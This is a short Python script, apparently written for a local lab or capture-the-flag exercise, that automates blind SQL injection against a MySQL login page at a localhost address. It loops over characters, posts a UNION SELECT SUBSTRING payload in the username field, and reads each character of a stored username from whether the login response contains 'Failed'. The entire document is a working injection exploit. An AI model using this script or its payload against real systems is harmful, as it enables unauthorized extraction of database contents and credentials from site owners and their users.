#!/bin/env python3

"""
Script to automate blind SQL injection on MySQL database 
"""

import requests
import string 
import time

url = 'http://127.0.0.1/authentication.php'

start = time.time()

def injectsql():
    """Function: Perform SQL injection on user form"""
    session = requests.Session()
    # Define characters used to brute force/compare 
    numbers = '0123456789'
    characters = string.ascii_letters + numbers
    l = 1
    flag = ''
    # Iterate through length of username
    while l <= 10:
        # For each character compare values to find match
        for c in characters:
            request = session.post(url, data={'user':f"' UNION SELECT null,SUBSTRING(username, {l}, 1) AS ExtractString FROM user WHERE SUBSTRING(username, {l},1) = '{c}' LIMIT 1#",'pass':'1234'})
            response = request.text
            # Found a match
            print(f'Testing: {c}')
            if not 'Failed' in response:
                print(flag)
                flag = flag + c
                break
        l += 1
    print('Username: ', flag)
    end = time.time()
    rt = end - start
    print('Response time: ', rt )

injectsql()
